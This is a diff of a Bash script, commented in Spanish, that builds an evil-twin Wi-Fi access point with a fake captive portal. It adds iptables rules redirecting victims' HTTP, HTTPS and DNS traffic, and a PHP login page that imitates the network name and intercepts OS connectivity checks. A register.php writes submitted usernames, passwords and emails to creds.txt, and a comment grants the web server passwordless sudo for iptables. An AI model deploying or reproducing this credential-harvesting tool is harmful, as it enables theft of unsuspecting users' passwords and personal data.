@@ -16,6 +16,7 @@ PASSWORD_CRACKED="A123456789a!"
 
 FILE_isc="isc-dhcp-server"
 DIRECTORY="./templates/"
+DIR_WEB=/var/www/html/
 FILE_dhcp="dhcpd.conf"
 
 activate_dhcp(){
@@ -35,7 +36,7 @@ activate_dhcp(){
 subnet 192.168.1.0 netmask 255.255.255.0 {
     range 192.168.1.15 192.168.1.200;
     option routers 192.168.1.1;
-    option domain-name-servers 8.8.8.8, 8.8.4.4;
+    option domain-name-servers 1.1.1.1,8.8.8.8;
     option broadcast-address 192.168.1.255;
     default-lease-time 600;
     max-lease-time 7200;
@@ -96,8 +97,14 @@ rules_iptables_ipforward(){
     sudo iptables -A FORWARD -i wlan0 -p tcp --dport 443 -d 192.168.1.1 -j ACCEPT
 
     # Redirigir todo el tráfico HTTP al portal cautivo
-    sudo iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 -j DNAT --to-destination 192.168.1.1
-    
+    sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 192.168.1.1:80
+    sudo iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination 192.168.1.1:443
+
+    # Redirigir tráfico DNS UDP (puerto 53) a 192.168.1.1
+    iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to-destination 192.168.1.1:53
+
+    # Redirigir tráfico DNS TCP (puerto 53) a 192.168.1.1
+    iptables -t nat -A PREROUTING -p tcp --dport 53 -j DNAT --to-destination 192.168.1.1:53
 
 }
 
@@ -116,7 +123,12 @@ cleanup() {
     sudo iptables -D FORWARD -i wlan0 -p tcp --dport 443 -d 192.168.1.1 -j ACCEPT
 
     # Eliminar la regla de redirección del tráfico HTTP al portal cautivo
-    sudo iptables -t nat -D PREROUTING -i wlan0 -p tcp --dport 80 -j DNAT --to-destination 192.168.1.1
+    sudo iptables -t nat -D PREROUTING -i wlan0 -p tcp --dport 80 -j DNAT --to-destination 192.168.1.1:80
+    sudo iptables -t nat -D PREROUTING -i wlan0 -p tcp --dport 443 -j DNAT --to-destination 192.168.1.1:443
+
+    # Eliminar la regla de redirección DNS UDP (puerto 53) a 192.168.1.1
+    iptables -t nat -A PREROUTING -i wlan0 -p udp --dport 53 -j DNAT --to-destination 192.168.1.1:53
+    iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 53 -j DNAT --to-destination 192.168.1.1:53
 
     sudo sysctl -w net.ipv4.ip_forward=0
     echo "[+] Reglas de iptables eliminadas. Saliendo..."
@@ -133,6 +145,187 @@ cleanup() {
     sudo rm "${DIRECTORY}${FILE_isc}"
     sudo rm "${DIRECTORY}${FILE_dhcp}"
 }
+
+
+
+create_fake_captive_portal(){
+
+    cat <<EOF > "${DIRECTORY}index.php"
+<?php
+// Configuración
+\$portal_url = "http://192.168.1.1/index.php";
+\$essid = "${ESSID_VAR}";
+
+// Detectar si el cliente ya está autenticado
+if (isset(\$_COOKIE['auth']) && \$_COOKIE['auth'] === 'ok') {
+    // Responder a comprobaciones de sistema operativo con "éxito"
+    if (strpos(\$_SERVER['REQUEST_URI'], '/generate_204') !== false) {
+        http_response_code(204);  // Android
+        exit;
+    }
+
+    if (strpos(\$_SERVER['REQUEST_URI'], 'hotspot-detect.html') !== false) {
+        echo "Success";  // Apple
+        exit;
+    }
+
+    if (strpos(\$_SERVER['REQUEST_URI'], 'connecttest.txt') !== false) {
+        echo "Microsoft Connect Test";  // Windows
+        exit;
+    }
+}
+
+// Detección mejorada
+\$userAgent = strtolower(\$_SERVER['HTTP_USER_AGENT'] ?? '');
+\$requestUri = strtolower(\$_SERVER['REQUEST_URI'] ?? '');
+
+\$captive_checks = [
+    'captivenetworksupport',
+    'wispr',
+    'android',
+    'microsoft ncsi',
+    'ms-office',
+    'xbox'
+];
+
+\$test_paths = [
+    '/generate_204',
+    '/hotspot-detect.html',
+    '/ncsi.txt',
+    '/connecttest.txt',
+    '/connectivity-check.html'
+];
+
+if (in_array(\$requestUri, \$test_paths)) {
+    header("Location: \$portal_url");
+    exit;
+}
+
+foreach (\$captive_checks as \$check) {
+    if (strpos(\$userAgent, \$check) !== false) {
+        header("Location: \$portal_url");
+        exit;
+    }
+}
+?>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Required - <?php echo htmlspecialchars(\$essid); ?></title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="portal">
+        <h1>WiFi Login - <?php echo htmlspecialchars(\$essid); ?></h1>
+        <form action="register.php" method="POST">
+            <input type="text" name="username" placeholder="Username" required>
+            <input type="password" name="password" placeholder="Password" required>
+            <input type="email" name="email" placeholder="Email" required>
+            <button type="submit">Connect</button>
+        </form>
+    </div>
+</body>
+</html>
+EOF
+
+    cat <<EOF > "${DIRECTORY}style.css"
+body {
+    font-family: Arial, sans-serif;
+    background: #f0f0f0;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    margin: 0;
+}
+
+.portal {
+    background: white;
+    padding: 2rem;
+    border-radius: 8px;
+    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+    text-align: center;
+    width: 300px;
+}
+
+input {
+    width: 100%;
+    padding: 10px;
+    margin: 10px 0;
+    border: 1px solid #ddd;
+    border-radius: 4px;
+}
+
+button {
+    background: #007bff;
+    color: white;
+    border: none;
+    padding: 10px 15px;
+    border-radius: 4px;
+    cursor: pointer;
+    width: 100%;
+}
+
+button:hover {
+    background: #0056b3;
+}
+EOF
+
+    cat <<'EOF' > "${DIRECTORY}register.php"
+<?php
+// Mostrar errores en desarrollo
+error_reporting(E_ALL);
+ini_set('display_errors', 1);
+
+// Ruta al archivo donde guardar credenciales
+$file = '/var/www/html/creds.txt';
+
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    $username = htmlspecialchars($_POST['username'] ?? '');
+    $password = htmlspecialchars($_POST['password'] ?? '');
+    $email = htmlspecialchars($_POST['email'] ?? '');
+    $ip = $_SERVER['REMOTE_ADDR'];
+
+    $data = "$username:$password:$email\n";
+
+    // Guardar datos
+    file_put_contents($file, $data, FILE_APPEND);
+
+    // Permitir tráfico a la IP
+    shell_exec("sudo iptables -D FORWARD -s $ip -j ACCEPT 2>/dev/null");
+    shell_exec("sudo iptables -I FORWARD -s $ip -j ACCEPT");
+    shell_exec("sudo iptables -t nat -I PREROUTING -p udp --dport 53 -s $ip -j RETURN");
+    shell_exec("sudo iptables -t nat -I PREROUTING -p tcp --dport 53 -s $ip -j RETURN");
+
+    // Establecer cookie de autenticación (válida 1 hora)
+    setcookie("auth", "ok", time()+3600, "/");
+
+    // Redirigir a una ruta que active cierre automático del portal
+    header("Location: /generate_204");
+    exit();
+} else {
+    header("HTTP/1.1 400 Bad Request");
+    echo "Método no permitido";
+    exit();
+}
+?>
+EOF
+}
+
+move_files_created(){
+
+    cp "${DIRECTORY}index.php" "${DIR_WEB}index.php"
+    cp "${DIRECTORY}style.css" "${DIR_WEB}style.css"
+    cp "${DIRECTORY}register.php" "${DIR_WEB}register.php"
+
+    sudo touch /var/www/html/creds.txt
+    sudo chmod 664 /var/www/html/creds.txt
+    sudo chown www-data:www-data /var/www/html/creds.txt
+
+}
+
 
 false_ap(){
 
@@ -219,115 +412,12 @@ fi
     sudo hostapd hostapd.conf #-B for broadcast
 
 }
-
-
-
-
-
-create_fake_captive_portal(){
-
-    cat <<EOF > "${DIRECTORY}index.php"
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Captive Portal $ESSID_VAR</title>
-    <link rel="stylesheet" href="style.css">
-</head>
-<body>
-    <div class="portal">
-        <h1>WiFi Login $ESSID_VAR</h1>
-        <form action="register.php" method="POST">
-            <input type="text" name="username" placeholder="Username" required>
-            <input type="password" name="password" placeholder="Password" required>
-            <input type="email" name="email" placeholder="Email" required>
-            <button type="submit">Register</button>
-        </form>
-    </div>
-</body>
-</html>
-EOF
-
-    cat <<EOF > "${DIRECTORY}style.css"
-body {
-    font-family: Arial, sans-serif;
-    background: #f0f0f0;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    height: 100vh;
-    margin: 0;
-}
-
-.portal {
-    background: white;
-    padding: 2rem;
-    border-radius: 8px;
-    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-    text-align: center;
-    width: 300px;
-}
-
-input {
-    width: 100%;
-    padding: 10px;
-    margin: 10px 0;
-    border: 1px solid #ddd;
-    border-radius: 4px;
-}
-
-button {
-    background: #007bff;
-    color: white;
-    border: none;
-    padding: 10px 15px;
-    border-radius: 4px;
-    cursor: pointer;
-    width: 100%;
-}
-
-button:hover {
-    background: #0056b3;
-}
-EOF
-
-    cat <<EOF > "${DIRECTORY}login.php"
-<?php
-
-$file = '/var/www/html/creds.txt';
-
-if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-    $username = htmlspecialchars($_POST['username']);
-    $password = htmlspecialchars($_POST['password']);
-    $email = htmlspecialchars($_POST['email']);
-
-    
-    $data = "$username:$password:$email\n";
-
-    
-    file_put_contents($file, $data, FILE_APPEND | LOCK_EX);
-
-    
-    header('Location: index.php?success=1');
-    exit;
-}
-?>
-EOF
-}
-
-touch /var/www/html/creds.txt
-                                                                                                                                                                                                                                  
-chmod 775 /var/www/html/creds.txt    
-                                                                                                                                                                                                                                  
-chown www-data /var/www/html/creds.txt    
-
-
-
+create_fake_captive_portal
+move_files_created
 false_ap
 trap cleanup EXIT
 
-#fake_captive_portal
 
 
-# echo "www-data ALL=(ALL) NOPASSWD: /sbin/iptables" >> /etc/sudoers Para que se pueda ejecutar iptables el PHP
+#sudo visudo
+#www-data ALL=(ALL) NOPASSWD: /sbin/iptables
